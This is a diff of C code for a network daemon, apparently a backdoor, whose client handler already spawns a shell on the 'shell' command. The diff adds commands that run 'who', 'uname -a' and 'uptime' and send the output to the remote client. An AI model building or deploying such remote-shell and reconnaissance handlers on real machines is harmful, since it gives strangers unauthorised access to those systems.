@@ -85,15 +85,24 @@ static void	process_client_messages(t_shield *daemon, fd_set *read_fds)
 			}
 			else
 			{
-				if (!strcmp(buffer, "quit"))
-				{
-					daemon->stop_flag = 1;
-					break ;
-				}
+				if (!strcmp(buffer, "?"))
+					print_usage(client_fd);
 				else if (!strcmp(buffer, "shell"))
 				{
 					spawn_shell(daemon, client_fd);
 					return ;
+				}
+				else if (!strcmp(buffer, "users"))
+					send_cmd_output("who", client_fd);
+				else if (!strcmp(buffer, "system"))
+				{
+					send_cmd_output("uname -a", client_fd);
+					send_cmd_output("uptime", client_fd);
+				}
+				else if (!strcmp(buffer, "quit"))
+				{
+					daemon->stop_flag = 1;
+					break ;
 				}
 				else
 				{
